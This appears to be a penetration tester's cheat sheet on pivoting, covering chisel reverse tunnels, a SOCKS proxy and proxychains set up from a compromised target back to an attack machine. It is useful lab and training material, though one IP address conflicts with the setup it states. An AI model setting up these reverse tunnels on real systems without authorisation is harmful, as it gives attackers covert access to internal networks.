# Port Tunnelling 

Typical use. Examples assume Kali or other attack box is 10.10.14.3, client is running from 10.10.10.10.

## On local machine:
1. Start server listening on 8000:
    ./chisel server -p 8000 --reverse

2. Upload the chisel binary to the computer using http/netcat  

## On remote Machine 
3. Start chisel as a client, to forward port 1738 locally to 172.17.0.1 machine on port 22 
    ./chisel client 10.11.18.40:8000 R:1738:172.17.0.1:22

### SSH Connection
4. To, for example, SSH from the remote machine, using our local machine- we can just:
    ssh user@localhost -p 1738

## Expanded

To set up the Chisel server on a Windows machine, you will need to get the Windows binary and vice versa.

To create a SOCKs server with Chisel, you will only need two commands ran on the target and the attacking machine, outlined below.

On the attacking machine: ./chisel server -p 8000 --reverse

On the target machine: ./chisel client <SERVER IP>:8000 R:socks

Now that we have a SOCKs server set up, we need to interpret and manage these connections. This is where proxychains come in. Proxychains allows us to connect to the SOCKs server and route traffic through the proxy in the command line. To add the SOCKs server to proxychains, you will need to edit /etc/proxychains.conf. You can see an example configuration below.

You will need to add the following line to the configuration file: socks5 127.0.0.1 1080

To use the proxy, you will need to prepend any commands you want to route through the proxy with proxychains. An example usage can be found below.

Example usage: proxychains ping <IP>
